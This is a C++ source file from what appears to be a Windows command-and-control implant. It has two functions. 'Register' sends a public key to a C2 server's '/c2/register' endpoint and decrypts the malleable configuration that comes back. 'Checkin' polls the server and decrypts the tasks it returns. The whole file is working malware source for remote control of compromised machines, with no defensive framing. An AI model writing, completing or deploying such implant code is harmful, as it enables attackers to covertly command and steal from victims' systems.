#include <windows.h>
#include "rapidjson/document.h"
#include "httpclient.h"
#include "implant.h"
#include "crypto.h"
#include "profile.h"
#include "task.h"
#include "debug.h"
#include <string>
#include <iostream>

using namespace std;

MalleableProfile *Register(LPCWSTR serverUrl, std::string pubKey, std::string privKey)
{
    rapidjson::Document registerDocument;
    registerDocument.SetObject();
    rapidjson::Document::AllocatorType &allocator = registerDocument.GetAllocator();
    rapidjson::Value pubKeyVal(pubKey.c_str(), allocator);
    registerDocument.AddMember("txid", pubKeyVal, allocator);

    rapidjson::StringBuffer buffer;
    rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
    registerDocument.Accept(writer);
    const char *key_json = buffer.GetString();

    PSIZE_T outSize = 0;

    // Register
    string res = HTTPRequest(L"POST", serverUrl, L"/c2/register", 8080, L"Hello-world", CONTENT_TYPE_JSON, (LPBYTE)key_json, strlen(key_json), outSize, FALSE);
    // string res_str = LPBYTEToString(res, GetLPBYTELength(res));
    DEBUG_PRINTF("Register response: %s", res.c_str());
    // cout << res_str << endl;
    rapidjson::Document resDocument;
    resDocument.Parse(res.c_str());

    DEBUG_PRINTF("status: %d\n", resDocument["status"].GetBool());
    DEBUG_PRINTF("Config: %s\n", resDocument["c"].GetString());

    const rapidjson::Value &c = resDocument["c"];
    string c_str = c.GetString();
    string cDecoded = base64DecodeToString(c_str);
    string b64ServerPubKey = resDocument["k"].GetString();

    // We still need to decrypt the config
    string decryptedConfig = decryptB64String(b64ServerPubKey, privKey, c_str);

    cout << decryptedConfig << endl;

    return parseMalleableConfig(decryptedConfig, privKey);
}

Task *Checkin(LPCWSTR serverUrl, MalleableProfile *profile)
{
    DEBUG_PRINTF("Checkin\n");
    PSIZE_T outSize = 0;
    string res = HTTPRequest(L"POST", serverUrl, L"/c2/register", 8080, L"Hello-world", NULL, NULL, 0, outSize, FALSE);

    // decode and decrypt the response
    string resDecoded = decryptB64String(profile->base64ServerPublicKey,
                                         profile->base64EncryptionKey,
                                         res);
    return parseTask(resDecoded);
}